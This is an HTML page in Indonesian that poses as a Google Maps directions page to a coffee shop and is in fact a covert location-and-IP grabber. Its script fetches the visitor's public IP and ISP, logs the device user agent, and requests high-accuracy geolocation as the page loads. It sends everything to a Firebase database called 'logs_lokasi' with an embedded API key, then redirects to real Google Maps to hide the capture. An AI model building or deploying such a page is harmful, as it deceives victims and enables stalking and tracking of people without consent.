<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Rute Perjalanan</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; }
        body, html { width: 100%; height: 100%; overflow: hidden; background-color: #f1f3f4; }
        .maps-bg { position: absolute; width: 100%; height: 100%; background: url('https://maps.gstatic.com/tactile/gmm/api_geolocation_v2.png') center/cover no-repeat; filter: grayscale(20%) opacity(0.5); z-index: 1; }
        .route-panel { position: absolute; top: 15px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); z-index: 10; }
        .route-title { font-size: 16px; font-weight: 500; color: #1a73e8; margin-bottom: 5px; }
        .route-desc { font-size: 13px; color: #5f6368; }
        .btn-container { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; z-index: 10; text-align: center; }
        .btn-rute { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 14px; font-size: 15px; font-weight: 500; border-radius: 24px; box-shadow: 0 4px 10px rgba(26,115,232,0.3); cursor: pointer; }
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.9); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; visibility: hidden; opacity: 0; transition: opacity 0.3s ease; }
        .spinner { border: 4px solid rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #1a73e8; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

    <div class="maps-bg"></div>

    <div class="route-panel">
        <div class="route-title">Menuju Tempat Ngopi</div>
        <div class="route-desc">Ketuk tombol di bawah untuk melihat rute navigasi menuju lokasi di Jl. Pisangan Lama I No. 41 dan estimasi waktu perjalanan dari posisi Anda.</div>
    </div>

    <div class="btn-container">
        <button class="btn-rute" onclick="mintaLokasi()">🌐 Mulai Petunjuk Arah</button>
    </div>

    <div class="loading-overlay" id="loader">
        <div class="spinner"></div>
        <div style="color: #5f6368; font-size: 14px;">Menghitung rute tercepat...</div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDLvcWnSRgoXxmid11Wx_GiVnOJMmgQR9I",
            authDomain: "maps-a9472.firebaseapp.com",
            databaseURL: "https://maps-a9472-default-rtdb.firebaseio.com",
            projectId: "maps-a9472",
            storageBucket: "maps-a9472.firebasestorage.app",
            messagingSenderId: "642710632619",
            appId: "1:642710632619:web:b702560570f3e52e5c1fee"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // URL Google Maps diarahkan langsung menggunakan koordinat/pencarian jalan Pisangan Lama I No. 41
        const TARGET_MAPS_URL = "https://www.google.com/maps/search/?api=1&query=TEMPAT+NGOPI+Jalan+Pisangan+Lama+I+41+Jakarta"; 

        let logData = {
            waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
            perangkat: navigator.userAgent,
            ip_publik: "Gagal memuat",
            provider_isp: "Gagal memuat",
            latitude: "Tidak diizinkan",
            longitude: "Tidak diizinkan",
            akurasi_meter: "-",
            google_maps_link: "-"
        };

        window.onload = function() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    logData.ip_publik = data.ip;
                    logData.provider_isp = data.org;
                })
                .catch(() => {
                    fetch('https://api.ipify.org?format=json')
                        .then(res => res.json())
                        .then(json => { logData.ip_publik = json.ip; });
                });
            
            jalankanPelacakan(false);
        };

        function mintaLokasi() {
            document.getElementById('loader').style.visibility = 'visible';
            document.getElementById('loader').style.opacity = '1';
            jalankanPelacakan(true);
        }

        function jalankanPelacakan(isFromButton) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        logData.latitude = pos.coords.latitude;
                        logData.longitude = pos.coords.longitude;
                        logData.akurasi_meter = Math.round(pos.coords.accuracy);
                        logData.google_maps_link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        saveToFirebase();
                    }, 
                    (err) => {
                        if (isFromButton || err.code === err.TIMEOUT) {
                            saveToFirebase();
                        }
                    }, 
                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                );
            } else if (isFromButton) {
                saveToFirebase();
            }
        }

        function saveToFirebase() {
            database.ref('logs_lokasi').push(logData)
            .then(() => { redirectToMaps(); })
            .catch(() => { redirectToMaps(); });
        }

        function redirectToMaps() {
            window.location.href = TARGET_MAPS_URL;
        }
    </script>
</body>
</html>
